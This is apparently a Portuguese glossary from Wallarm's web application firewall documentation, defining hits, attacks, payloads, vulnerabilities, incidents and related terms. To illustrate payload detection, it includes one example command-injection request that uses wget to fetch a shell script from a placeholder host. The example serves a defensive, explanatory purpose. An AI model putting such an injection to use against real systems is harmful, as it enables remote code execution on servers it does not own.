# Glossário

O glossário abrange as principais entidades do Wallarm para fornecer uma melhor compreensão da plataforma.

## Hit

Um hit é uma solicitação maliciosa serializada (solicitação maliciosa original e metadados adicionados pelo nó de filtragem), por exemplo:

![Exemplo de hit](images/user-guides/events/analyze-attack-raw.png)

[Detalhes dos parâmetros de hit](user-guides/events/analyze-attack.md#analyze-requests-in-an-event)

## Ataque

Um ataque é um único hit ou vários hits agrupados pelas seguintes características:

* O mesmo tipo de ataque, o parâmetro com a carga maliciosa e o endereço ao qual os hits foram enviados. Os hits podem vir dos mesmos ou diferentes endereços IP e ter diferentes valores das cargas maliciosas dentro de um tipo de ataque.

   Este método de agrupamento de hits é básico e aplicado a todos os hits.
* O mesmo endereço IP de origem se a [trigger](user-guides/triggers/trigger-examples.md#group-hits-originating-from-the-same-ip-into-one-attack) apropriado estiver ativado. Outros valores de parâmetros de hit podem variar.

   Este método de agrupamento de hits funciona para todos os hits, exceto para os do tipo Brute force, Brute force, Forced browsing, BOLA (IDOR), Limite de recursos, Bomba de dados e tipos de ataque de patch virtual.

   Se os hits são agrupados por este método, o botão [**Marcar como falso-positivo**](user-guides/events/false-attack.md#mark-an-attack-as-a-false-positive) e a opção de [verificação ativa](about-wallarm/detecting-vulnerabilities.md#active-threat-verification) não estão disponíveis para o ataque.

Os métodos de agrupamento de hits listados não se excluem. Se os hits possuírem características de ambos os métodos, todos serão agrupados em um ataque.

Um exemplo de um ataque incluindo um único hit:

![Ataque com um hit](images/glossary/attack-with-one-hit-example.png)

Um exemplo de um ataque incluindo muitos hits:

![Ataque com vários hits](images/glossary/attack-with-several-hits-example.png)

## Carga Maliciosa

Uma parte de uma solicitação original contendo os seguintes elementos:

* Sinais de ataque detectados em uma solicitação. Se vários sinais de ataque caracterizando o mesmo tipo de ataque forem detectados em uma solicitação, apenas o primeiro sinal será registrado como uma carga.
* Contexto do sinal de ataque. O contexto é um conjunto de símbolos que antecedem e fecham os sinais de ataque detectados. Como o comprimento de uma carga é limitado, o contexto pode ser omitido se um sinal de ataque for de comprimento total da carga.

Por exemplo:

* Solicitação:

    ```bash
    curl localhost/?23036d6ba7=%3Bwget+http%3A%2F%2Fsome_host%2Fsh311.sh
    ```
* Carga maliciosa:

    ```bash
    ;wget+http://s
    ```

    Nesta carga, `;wget+` é o sinal de ataque [RCE](attacks-vulns-list.md#remote-code-execution-rce) e outra parte da carga é o contexto do sinal de ataque.

Como os sinais de ataque não são usados para detectar [ataques comportamentais](about-wallarm/protecting-against-attacks.md#behavioral-attacks), solicitações enviadas como parte de ataques comportamentais têm cargas vazias.

## Vulnerabilidade
Uma vulnerabilidade é um erro cometido por negligência ou informações inadequadas ao construir ou implementar uma aplicação web que pode levar a um risco de segurança da informação.

Os riscos de segurança da informação são:

* Acesso não autorizado a dados; por exemplo, acesso para ler e modificar os dados do usuário.
* Negação de serviço.
* Corrupção de dados e outros.

O tráfego da internet pode ser usado para detectar as vulnerabilidades, que é uma das funções do Wallarm, entre outras.

## Incidente de Segurança

Um incidente de segurança é uma ocorrência de exploração de vulnerabilidade. Um incidente é um [ataque](#attack) direcionado a uma vulnerabilidade confirmada.

Um incidente, como um ataque, é uma entidade externa ao seu sistema e é uma característica da Internet externa, não do sistema em si. Apesar do fato de que os ataques direcionados às vulnerabilidades existentes são minoria, eles são da maior importância em termos de segurança da informação. O Wallarm detecta automaticamente os ataques direcionados às vulnerabilidades existentes e os exibe como um objeto separado - incidente.

## Buffer Circular
Um buffer circular é uma estrutura de dados que utiliza um único buffer de tamanho fixo como se estivesse conectado de ponta a ponta.
[Veja na Wikipedia](https://en.wikipedia.org/wiki/Circular_buffer).

## Conjunto de regras personalizadas (o termo anterior é LOM)

Um conjunto de regras personalizadas é um conjunto de regras de segurança compiladas baixadas pelos nós do Wallarm do Cloud do Wallarm.

As regras personalizadas permitem que você configure regras individuais para o processamento de tráfego, por exemplo:

* Mascara dados sensíveis antes de carregar para o Wallarm Cloud
* Crie indicadores de ataque baseados em expressões regulares
* Aplique um patch virtual bloqueando solicitações que exploram uma vulnerabilidade ativa
* Desative a detecção de ataque em certas solicitações, etc.

Um conjunto de regras personalizadas não está vazio por padrão, ele contém as regras criadas para todos os clientes registrados no cloud, por exemplo, a regra do modo de filtragem com o valor da [**aba Configurações → Geral**](user-guides/settings/general.md).

[Mais detalhes sobre conjuntos de regras personalizadas](user-guides/rules/rules.md)

## Solicitação Inválida
Uma solicitação que foi verificada pelo nó de filtro e não coincide com as regras do LOM.

## Proxy Reverso
Um proxy reverso é um tipo de servidor proxy que recupera recursos em nome de um cliente de um servidor e retorna os recursos para o cliente como se eles se originassem do próprio servidor da web.
[Veja na Wikipedia](https://en.wikipedia.org/wiki/Reverse_proxy).

## Autoridade Certificadora
Uma autoridade certificadora é uma entidade que emite certificados digitais.
[Veja na Wikipedia](https://en.wikipedia.org/wiki/Certificate_authority).
